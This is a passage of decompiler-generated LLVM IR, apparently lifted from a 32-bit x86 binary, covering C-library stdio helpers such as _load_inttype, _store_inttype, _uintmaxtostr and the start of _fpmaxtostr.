dec_label_pc_8054bd7:                             ; preds = %dec_label_pc_8054bd2
  %v2_8054bd7 = and i32 %v3_8054bb6, 4
  %v3_8054bd7 = icmp eq i32 %v2_8054bd7, 0
  %v1_8054bda = icmp eq i1 %v3_8054bd7, false
  br i1 %v1_8054bda, label %dec_label_pc_8054c08, label %dec_label_pc_8054bdc

dec_label_pc_8054bdc:                             ; preds = %dec_label_pc_8054bd7
  %v1_8054bdc = add i32 %v0_8054bfb, 20
  %v2_8054bdc = inttoptr i32 %v1_8054bdc to i32*
  %v3_8054bdc = load i32, i32* %v2_8054bdc, align 4
  store i32 %v3_8054bdc, i32* %eax.global-to-local, align 4
  %v2_8054bdf = add i32 %v0_8054bfb, 16
  %v3_8054bdf = inttoptr i32 %v2_8054bdf to i32*
  %v4_8054bdf = load i32, i32* %v3_8054bdf, align 4
  %v15_8054bdf = icmp eq i32 %v3_8054bdc, %v4_8054bdf
  %v1_8054be2 = icmp eq i1 %v15_8054bdf, false
  br i1 %v1_8054be2, label %dec_label_pc_8054be9, label %dec_label_pc_8054be4

dec_label_pc_8054be4:                             ; preds = %dec_label_pc_8054bdc
  %v2_8054be4 = and i32 %v3_8054bb6, 2
  %v3_8054be4 = icmp eq i32 %v2_8054be4, 0
  br i1 %v3_8054be4, label %dec_label_pc_8054c08, label %dec_label_pc_8054be9

dec_label_pc_8054be9:                             ; preds = %dec_label_pc_8054be4, %dec_label_pc_8054bdc
  %v1_8054be9 = and i32 %v3_8054bb6, 1024
  store i32 %v1_8054be9, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_8054be9, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_8054bfc = call i32 @__GI_fseek(i32 %v0_8054bfb, i32 0, i32 %tmp18, i32 %v1_8054be9)
  store i32 %v5_8054bfc, i32* %eax.global-to-local, align 4
  %v1_8054c04 = icmp eq i32 %v5_8054bfc, 0
  %v1_8054c06 = icmp eq i1 %v1_8054c04, false
  br i1 %v1_8054c06, label %dec_label_pc_8054bc9, label %dec_label_pc_8054be9.dec_label_pc_8054c08_crit_edge

dec_label_pc_8054be9.dec_label_pc_8054c08_crit_edge: ; preds = %dec_label_pc_8054be9
  %v0_8054c08.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054c08

dec_label_pc_8054c08:                             ; preds = %dec_label_pc_8054be9.dec_label_pc_8054c08_crit_edge, %dec_label_pc_8054be4, %dec_label_pc_8054bd7
  %v10_8054c08 = phi i32 [ %v0_8054c08.pre, %dec_label_pc_8054be9.dec_label_pc_8054c08_crit_edge ], [ %v0_8054bfb, %dec_label_pc_8054be4 ], [ %v0_8054bfb, %dec_label_pc_8054bd7 ]
  %v1_8054c08 = inttoptr i32 %v10_8054c08 to i16*
  %v2_8054c08 = load i16, i16* %v1_8054c08, align 2
  %v3_8054c08 = and i16 %v2_8054c08, -4
  store i16 %v3_8054c08, i16* %v1_8054c08, align 2
  %v0_8054c0c = load i32, i32* @ebx, align 4
  %v1_8054c0c = add i32 %v0_8054c0c, 8
  %v2_8054c0c = inttoptr i32 %v1_8054c0c to i32*
  %v3_8054c0c = load i32, i32* %v2_8054c0c, align 4
  store i32 %v3_8054c0c, i32* %eax.global-to-local, align 4
  %v2_8054c0f = add i32 %v0_8054c0c, 24
  %v3_8054c0f = inttoptr i32 %v2_8054c0f to i32*
  store i32 %v3_8054c0c, i32* %v3_8054c0f, align 4
  %v0_8054c12 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054c12 = load i32, i32* @ebx, align 4
  %v2_8054c12 = add i32 %v1_8054c12, 16
  %v3_8054c12 = inttoptr i32 %v2_8054c12 to i32*
  store i32 %v0_8054c12, i32* %v3_8054c12, align 4
  %v0_8054c15 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054c15 = load i32, i32* @ebx, align 4
  %v2_8054c15 = add i32 %v1_8054c15, 20
  %v3_8054c15 = inttoptr i32 %v2_8054c15 to i32*
  store i32 %v0_8054c15, i32* %v3_8054c15, align 4
  %v0_8054c18.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054c18

dec_label_pc_8054c18:                             ; preds = %dec_label_pc_8054bd2, %dec_label_pc_8054c08
  %v9_8054c18 = phi i32 [ %v0_8054bfb, %dec_label_pc_8054bd2 ], [ %v0_8054c18.pre, %dec_label_pc_8054c08 ]
  %v1_8054c18 = inttoptr i32 %v9_8054c18 to i16*
  %v2_8054c18 = load i16, i16* %v1_8054c18, align 2
  %v3_8054c18 = or i16 %v2_8054c18, 64
  store i16 %v3_8054c18, i16* %v1_8054c18, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8054c1e = load i32, i32* @ebx, align 4
  %v1_8054c1e = inttoptr i32 %v0_8054c1e to i16*
  %v2_8054c1e = load i16, i16* %v1_8054c1e, align 2
  %v3_8054c1e = zext i16 %v2_8054c1e to i32
  store i32 %v3_8054c1e, i32* %eax.global-to-local, align 4
  %v3_8054c21 = and i16 %v2_8054c1e, 2816
  %v4_8054c21 = icmp eq i16 %v3_8054c21, 0
  %v1_8054c24 = icmp eq i1 %v4_8054c21, false
  br i1 %v1_8054c24, label %dec_label_pc_8054c2c, label %dec_label_pc_8054c26

dec_label_pc_8054c26:                             ; preds = %dec_label_pc_8054c18
  %v1_8054c26 = add i32 %v0_8054c1e, 12
  %v2_8054c26 = inttoptr i32 %v1_8054c26 to i32*
  %v3_8054c26 = load i32, i32* %v2_8054c26, align 4
  store i32 %v3_8054c26, i32* %eax.global-to-local, align 4
  %v2_8054c29 = add i32 %v0_8054c1e, 28
  %v3_8054c29 = inttoptr i32 %v2_8054c29 to i32*
  store i32 %v3_8054c26, i32* %v3_8054c29, align 4
  %v0_8054c2c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054c2c

dec_label_pc_8054c2c:                             ; preds = %dec_label_pc_8054c18, %dec_label_pc_8054bc9, %dec_label_pc_8054c26
  %v0_8054c2c = phi i32 [ 0, %dec_label_pc_8054c18 ], [ -1, %dec_label_pc_8054bc9 ], [ %v0_8054c2c.pre, %dec_label_pc_8054c26 ]
  store i32 %v0_8054c2c, i32* %eax.global-to-local, align 4
  %v2_8054c2e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054c2e, i32* %edx.global-to-local, align 4
  store i32 %v0_8054b94, i32* @ebx, align 4
  ret i32 %v0_8054c2c

; uselistorder directives
  uselistorder i32 %v0_8054c2c, { 1, 0 }
  uselistorder i32 %v0_8054c1e, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_8054be9, { 1, 0, 2 }
  uselistorder i32 %v0_8054bfb, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8054ba2, { 1, 0 }
  uselistorder i32 %v2_8054ba0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8054b94, { 1, 0 }
  uselistorder i32 1024, { 0, 13, 3, 9, 7, 14, 4, 1, 2, 11, 5, 10, 6, 12, 8 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054c2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054c18, { 1, 0 }
  uselistorder label %dec_label_pc_8054bb6, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8054c3c = icmp slt i32 %tmp, 0
  %v3_8054c65 = and i32 %tmp5, 2048
  %v4_8054c65 = icmp eq i32 %v3_8054c65, 0
  br i1 %v5_8054c3c, label %dec_label_pc_8054c65, label %dec_label_pc_8054c43

dec_label_pc_8054c43:                             ; preds = %entry
  %v1_8054c46 = icmp eq i1 %v4_8054c65, false
  br i1 %v1_8054c46, label %dec_label_pc_8054c6a, label %dec_label_pc_8054c48

dec_label_pc_8054c48:                             ; preds = %dec_label_pc_8054c43
  %v1_8054c48 = inttoptr i32 %tmp4 to i32*
  %v2_8054c48 = load i32, i32* %v1_8054c48, align 4
  %v6_8054c4a = icmp eq i32 %tmp5, 256
  %v1_8054c50 = icmp eq i1 %v6_8054c4a, false
  br i1 %v1_8054c50, label %dec_label_pc_8054c57, label %dec_label_pc_8054c52

dec_label_pc_8054c52:                             ; preds = %dec_label_pc_8054c48
  %v1_8054c52 = urem i32 %v2_8054c48, 256
  br label %dec_label_pc_8054c62

dec_label_pc_8054c57:                             ; preds = %dec_label_pc_8054c48
  %v6_8054c57 = icmp eq i32 %tmp5, 512
  %v1_8054c5d = icmp eq i1 %v6_8054c57, false
  br i1 %v1_8054c5d, label %dec_label_pc_8054c62, label %dec_label_pc_8054c5f

dec_label_pc_8054c5f:                             ; preds = %dec_label_pc_8054c57
  %v1_8054c5f = urem i32 %v2_8054c48, 65536
  br label %dec_label_pc_8054c62

dec_label_pc_8054c62:                             ; preds = %dec_label_pc_8054c57, %dec_label_pc_8054c52, %dec_label_pc_8054c5f
  %v0_8054c64 = phi i32 [ %v2_8054c48, %dec_label_pc_8054c57 ], [ %v1_8054c52, %dec_label_pc_8054c52 ], [ %v1_8054c5f, %dec_label_pc_8054c5f ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8054c64

dec_label_pc_8054c65:                             ; preds = %entry
  br i1 %v4_8054c65, label %dec_label_pc_8054c70, label %dec_label_pc_8054c6a

dec_label_pc_8054c6a:                             ; preds = %dec_label_pc_8054c65, %dec_label_pc_8054c43
  %v1_8054c6a = add i32 %tmp4, 4
  %v2_8054c6a = inttoptr i32 %v1_8054c6a to i32*
  %v3_8054c6a = load i32, i32* %v2_8054c6a, align 4
  store i32 %v3_8054c6a, i32* @edx, align 4
  %v1_8054c6d = inttoptr i32 %tmp4 to i32*
  %v2_8054c6d = load i32, i32* %v1_8054c6d, align 4
  ret i32 %v2_8054c6d

dec_label_pc_8054c70:                             ; preds = %dec_label_pc_8054c65
  %v1_8054c70 = inttoptr i32 %tmp4 to i32*
  %v2_8054c70 = load i32, i32* %v1_8054c70, align 4
  %v6_8054c72 = icmp eq i32 %tmp5, 256
  %v1_8054c78 = icmp eq i1 %v6_8054c72, false
  br i1 %v1_8054c78, label %dec_label_pc_8054c7f, label %dec_label_pc_8054c7a

dec_label_pc_8054c7a:                             ; preds = %dec_label_pc_8054c70
  %v1_8054c7a = mul i32 %v2_8054c70, 16777216
  %v2_8054c7a = sdiv i32 %v1_8054c7a, 16777216
  br label %dec_label_pc_8054c88

dec_label_pc_8054c7f:                             ; preds = %dec_label_pc_8054c70
  %v6_8054c7f = icmp eq i32 %tmp5, 512
  %v1_8054c85 = icmp eq i1 %v6_8054c7f, false
  br i1 %v1_8054c85, label %dec_label_pc_8054c88, label %dec_label_pc_8054c87

dec_label_pc_8054c87:                             ; preds = %dec_label_pc_8054c7f
  %v1_8054c87 = mul i32 %v2_8054c70, 65536
  %v2_8054c87 = sdiv i32 %v1_8054c87, 65536
  br label %dec_label_pc_8054c88

dec_label_pc_8054c88:                             ; preds = %dec_label_pc_8054c7f, %dec_label_pc_8054c7a, %dec_label_pc_8054c87
  %v0_8054c88 = phi i32 [ %v2_8054c70, %dec_label_pc_8054c7f ], [ %v2_8054c7a, %dec_label_pc_8054c7a ], [ %v2_8054c87, %dec_label_pc_8054c87 ]
  %v1_8054c88 = ashr i32 %v0_8054c88, 31
  store i32 %v1_8054c88, i32* @edx, align 4
  ret i32 %v0_8054c88

; uselistorder directives
  uselistorder i32 %v0_8054c88, { 1, 0 }
  uselistorder i32 %v2_8054c70, { 2, 0, 1 }
  uselistorder i32 %v2_8054c48, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8054c88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054c62, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8054c8c = load i32, i32* @ebx, align 4
  store i32 %v0_8054c8c, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8054c91 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8054c91, i32* %ebx.global-to-local, align 4
  %v4_8054c95 = trunc i32 %tmp4 to i16
  %v6_8054c9d = icmp eq i32 %tmp6, 256
  %v1_8054ca3 = icmp eq i1 %v6_8054c9d, false
  br i1 %v1_8054ca3, label %dec_label_pc_8054ca9, label %dec_label_pc_8054ca5

dec_label_pc_8054ca5:                             ; preds = %entry
  %v2_8054ca5 = trunc i32 %tmp4 to i8
  %v4_8054ca5 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8054ca5, i8* %v4_8054ca5, align 1
  br label %dec_label_pc_8054cc7

dec_label_pc_8054ca9:                             ; preds = %entry
  %v6_8054ca9 = icmp eq i32 %tmp6, 2048
  %v1_8054caf = icmp eq i1 %v6_8054ca9, false
  br i1 %v1_8054caf, label %dec_label_pc_8054cb8, label %dec_label_pc_8054cb1

dec_label_pc_8054cb1:                             ; preds = %dec_label_pc_8054ca9
  %sext2 = mul i32 %tmp4, 65536
  %v1_8054cb1 = sdiv i32 %sext2, 65536
  %v3_8054cb1 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8054cb1, i32* %v3_8054cb1, align 4
  %v0_8054cb3 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054cb3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054cb3 = add i32 %v1_8054cb3, 4
  %v3_8054cb3 = inttoptr i32 %v2_8054cb3 to i32*
  store i32 %v0_8054cb3, i32* %v3_8054cb3, align 4
  br label %dec_label_pc_8054cc7

dec_label_pc_8054cb8:                             ; preds = %dec_label_pc_8054ca9
  %v6_8054cb8 = icmp eq i32 %tmp6, 512
  %v1_8054cbe = icmp eq i1 %v6_8054cb8, false
  br i1 %v1_8054cbe, label %dec_label_pc_8054cc5, label %dec_label_pc_8054cc0

dec_label_pc_8054cc0:                             ; preds = %dec_label_pc_8054cb8
  store i16 %v4_8054c95, i16* %tmp5, align 2
  br label %dec_label_pc_8054cc7

dec_label_pc_8054cc5:                             ; preds = %dec_label_pc_8054cb8
  %sext3 = mul i32 %tmp4, 65536
  %v1_8054cc5 = sdiv i32 %sext3, 65536
  %v3_8054cc5 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8054cc5, i32* %v3_8054cc5, align 4
  br label %dec_label_pc_8054cc7

dec_label_pc_8054cc7:                             ; preds = %dec_label_pc_8054cc0, %dec_label_pc_8054cb1, %dec_label_pc_8054ca5, %dec_label_pc_8054cc5
  %v2_8054cc7 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054cc7, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8054cc8 = sdiv i32 %sext, 65536
  ret i32 %v1_8054cc8

; uselistorder directives
  uselistorder label %dec_label_pc_8054cc7, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8054cd7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054cd7, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8054ce3 = icmp slt i32 %arg4, 0
  %v1_8054ce5 = icmp eq i1 %v2_8054ce3, false
  br i1 %v1_8054ce5, label %dec_label_pc_8054d06, label %dec_label_pc_8054ce7

dec_label_pc_8054ce7:                             ; preds = %entry
  %v1_8054ce7 = sub i32 0, %arg4
  store i32 %v1_8054ce7, i32* %esi.global-to-local, align 4
  %v2_8054ce9 = icmp slt i32 %arg3, 0
  %v1_8054ceb = icmp eq i1 %v2_8054ce9, false
  br i1 %v1_8054ceb, label %dec_label_pc_8054d06, label %dec_label_pc_8054ced

dec_label_pc_8054ced:                             ; preds = %dec_label_pc_8054ce7
  %v1_8054ced = sub i32 0, %arg2
  %v5_8054ced = icmp ne i32 %arg2, 0
  store i32 %v1_8054ced, i32* %ecx.global-to-local, align 4
  %v2_8054cef = zext i1 %v5_8054ced to i32
  %v3_8054cef = add i32 %v2_8054cef, %arg3
  %v1_8054cfa = sub i32 0, %v3_8054cef
  store i32 %v1_8054cfa, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054d06

dec_label_pc_8054d06:                             ; preds = %entry, %dec_label_pc_8054ce7, %dec_label_pc_8054ced
  %v0_8054d0b = phi i32 [ %v1_8054ce7, %dec_label_pc_8054ced ], [ %v1_8054ce7, %dec_label_pc_8054ce7 ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8054ced ], [ 0, %dec_label_pc_8054ce7 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8054d0b
  %tmp35 = urem i32 -1, %v0_8054d0b
  %v1_8054d0d = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_8054d11 = load i32, i32* %esi.global-to-local, align 4
  %v12_8054d11 = icmp eq i32 %v1_8054d0d, %v1_8054d11
  %v1_8054d1b = icmp eq i1 %v12_8054d11, false
  br i1 %v1_8054d1b, label %dec_label_pc_8054d2a, label %dec_label_pc_8054d1d

dec_label_pc_8054d1d:                             ; preds = %dec_label_pc_8054d06
  %v1_8054d1d = add i32 %div, 1
  br label %dec_label_pc_8054d2a

dec_label_pc_8054d2a:                             ; preds = %dec_label_pc_8054d06, %dec_label_pc_8054d1d
  %stack_var_-20.0.off0 = phi i32 [ %v1_8054d0d, %dec_label_pc_8054d06 ], [ 0, %dec_label_pc_8054d1d ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8054d06 ], [ %v1_8054d1d, %dec_label_pc_8054d1d ]
  %v0_8054d2a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8054d2a, i32* %ebp.global-to-local, align 4
  %v0_8054d2c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054d2c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054d32

dec_label_pc_8054d32:                             ; preds = %dec_label_pc_8054d71, %dec_label_pc_8054d2a
  %v0_8054d69 = phi i32 [ %v0_8054d82, %dec_label_pc_8054d71 ], [ %v0_8054d2a, %dec_label_pc_8054d2a ]
  %v0_8054d36 = phi i32 [ %v1_8054d84, %dec_label_pc_8054d71 ], [ %v0_8054d2c, %dec_label_pc_8054d2a ]
  %v1_8054d32 = icmp eq i32 %v0_8054d36, 0
  br i1 %v1_8054d32, label %dec_label_pc_8054d69, label %dec_label_pc_8054d36

dec_label_pc_8054d36:                             ; preds = %dec_label_pc_8054d32
  %v0_8054d3a = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_8054d36, %v0_8054d3a
  %tmp36 = urem i32 %v0_8054d36, %v0_8054d3a
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_8054d69, %v0_8054d3a
  %tmp37 = urem i32 %v0_8054d69, %v0_8054d3a
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8054d4d = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_8054d51 = add i32 %tmp37, %v6_8054d4d
  %v8_8054d57 = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_8054d5c = add i32 %div8, %v8_8054d57
  store i32 %v2_8054d5c, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_8054d51, %v0_8054d3a
  %tmp38 = urem i32 %v2_8054d51, %v0_8054d3a
  %v2_8054d64 = add i32 %div9, %v2_8054d5c
  br label %dec_label_pc_8054d71

dec_label_pc_8054d69:                             ; preds = %dec_label_pc_8054d32
  %v0_8054d6d = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_8054d69, %v0_8054d6d
  %tmp39 = urem i32 %v0_8054d69, %v0_8054d6d
  br label %dec_label_pc_8054d71

dec_label_pc_8054d71:                             ; preds = %dec_label_pc_8054d36, %dec_label_pc_8054d69
  %v0_8054d77 = phi i32 [ %tmp38, %dec_label_pc_8054d36 ], [ %tmp39, %dec_label_pc_8054d69 ]
  %storemerge = phi i32 [ %v2_8054d64, %dec_label_pc_8054d36 ], [ %div12, %dec_label_pc_8054d69 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8054d71 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054d71 = add i32 %v0_8054d71, -1
  store i32 %v1_8054d71, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_8054d77, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_8054d77
  %v8_8054d77 = trunc i32 %storemerge14.in to i8
  %v3_8054d80 = inttoptr i32 %v1_8054d71 to i8*
  store i8 %v8_8054d77, i8* %v3_8054d80, align 1
  %v0_8054d82 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054d84 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d84 = or i32 %v1_8054d84, %v0_8054d82
  %v3_8054d84 = icmp eq i32 %v2_8054d84, 0
  %v1_8054d86 = icmp eq i1 %v3_8054d84, false
  br i1 %v1_8054d86, label %dec_label_pc_8054d32, label %dec_label_pc_8054d88

dec_label_pc_8054d88:                             ; preds = %dec_label_pc_8054d71
  %v4_8054d88 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_8054d88, label %dec_label_pc_8054d93, label %dec_label_pc_8054d8f

dec_label_pc_8054d8f:                             ; preds = %dec_label_pc_8054d88
  %v0_8054d8f = load i32, i32* %edi.global-to-local, align 4
  %v1_8054d8f = add i32 %v0_8054d8f, -1
  store i32 %v1_8054d8f, i32* %edi.global-to-local, align 4
  %v1_8054d90 = inttoptr i32 %v1_8054d8f to i8*
  store i8 45, i8* %v1_8054d90, align 1
  br label %dec_label_pc_8054d93

dec_label_pc_8054d93:                             ; preds = %dec_label_pc_8054d88, %dec_label_pc_8054d8f
  %v0_8054d96 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8054d96

; uselistorder directives
  uselistorder i32 %v2_8054d51, { 1, 0 }
  uselistorder i32 %v0_8054d3a, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8054d36, { 1, 0, 2 }
  uselistorder i32 %v0_8054d69, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8054d0b, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054d93, { 1, 0 }
  uselistorder label %dec_label_pc_8054d71, { 1, 0 }
  uselistorder label %dec_label_pc_8054d2a, { 1, 0 }
  uselistorder label %dec_label_pc_8054d06, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_5()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054da1 = load i32, i32* @edi, align 4
  %v0_8054da2 = load i32, i32* @esi, align 4
  %v0_8054da3 = load i32, i32* @ebx, align 4
  store i32 %v0_8054da3, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_8054db8 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8054db8 = add i3 %v4_8054db8, -1
  store i3 %v5_8054db8, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8054dbf = add i32 %tmp112, 4
  %v2_8054dbf = inttoptr i32 %v1_8054dbf to i32*
  %v3_8054dbf = load i32, i32* %v2_8054dbf, align 4
  store i32 %v3_8054dbf, i32* %eax.global-to-local, align 4
  %v1_8054dc6 = add i32 %tmp112, 8
  %v2_8054dc6 = inttoptr i32 %v1_8054dc6 to i8*
  %v3_8054dc6 = load i8, i8* %v2_8054dc6, align 1
  %v4_8054dc6 = zext i8 %v3_8054dc6 to i32
  %v5_8054dc6 = load i32, i32* @ecx, align 4
  %v6_8054dc6 = and i32 %v5_8054dc6, -256
  %v7_8054dc6 = or i32 %v6_8054dc6, %v4_8054dc6
  store i32 %v7_8054dc6, i32* %ecx.global-to-local, align 4
  %v1_8054dc9 = inttoptr i32 %tmp112 to i32*
  %v2_8054dc9 = load i32, i32* %v1_8054dc9, align 4
  store i32 %v2_8054dc9, i32* %ebp.global-to-local, align 4
  %v3_8054dcb = and i32 %v3_8054dbf, -256
  %v4_8054dcb = or i32 %v3_8054dcb, %v4_8054dc6
  %v1_8054dd1 = or i32 %v4_8054dcb, 32
  %v3_8054dd1 = trunc i32 %v1_8054dd1 to i8
  store i32 %v1_8054dd1, i32* %eax.global-to-local, align 4
  %v10_8054ddc = icmp eq i8 %v3_8054dd1, 97
  %v1_8054dde = icmp eq i1 %v10_8054ddc, false
  br i1 %v1_8054dde, label %dec_label_pc_8054de7, label %dec_label_pc_8054de0

dec_label_pc_8054de0:                             ; preds = %entry
  %v1_8054de0 = add i32 %v7_8054dc6, 6
  %v11_8054de0 = trunc i32 %v1_8054de0 to i8
  store i32 %v1_8054de0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054de7

dec_label_pc_8054de7:                             ; preds = %entry, %dec_label_pc_8054de0
  %stack_var_-206.0 = phi i8 [ %v3_8054dc6, %entry ], [ %v11_8054de0, %dec_label_pc_8054de0 ]
  %v2_8054de7 = icmp slt i32 %v2_8054dc9, 0
  %v1_8054de9 = icmp eq i1 %v2_8054de7, false
  br i1 %v1_8054de9, label %dec_label_pc_8054df0, label %dec_label_pc_8054deb

dec_label_pc_8054deb:                             ; preds = %dec_label_pc_8054de7
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054df0

dec_label_pc_8054df0:                             ; preds = %dec_label_pc_8054de7, %dec_label_pc_8054deb
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8054dff = add i32 %tmp112, 12
  %v2_8054dff = inttoptr i32 %v1_8054dff to i32*
  %v3_8054dff = load i32, i32* %v2_8054dff, align 4
  store i32 %v3_8054dff, i32* %eax.global-to-local, align 4
  %v2_8054e02 = and i32 %v3_8054dff, 2
  %v3_8054e02 = icmp eq i32 %v2_8054e02, 0
  br i1 %v3_8054e02, label %dec_label_pc_8054e10, label %dec_label_pc_8054e1c

dec_label_pc_8054e10:                             ; preds = %dec_label_pc_8054df0
  %v2_8054e10 = urem i32 %v3_8054dff, 2
  %tmp143 = trunc i32 %v2_8054e10 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_8054e1c

dec_label_pc_8054e1c:                             ; preds = %dec_label_pc_8054e10, %dec_label_pc_8054df0
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8054df0 ], [ %tmp144, %dec_label_pc_8054e10 ]
  %v1_8054e30 = udiv i32 %v3_8054dff, 256
  %tmp146 = and i32 %v1_8054e30, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_8054f82, label %dec_label_pc_8054ea2

dec_label_pc_8054ea2:                             ; preds = %dec_label_pc_8054e1c
  store i3 %v4_8054db8, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8054ea9 = add i32 %tmp112, 16
  %v2_8054ea9 = inttoptr i32 %v1_8054ea9 to i32*
  store i32 32, i32* %v2_8054ea9, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_8054ec0 = add i8 %stack_var_-206.0, -96
  %v6_8054ec0 = sub i8 95, %stack_var_-206.0
  %v7_8054ec0 = and i8 %v6_8054ec0, %stack_var_-206.0
  %v8_8054ec0 = icmp slt i8 %v7_8054ec0, 0
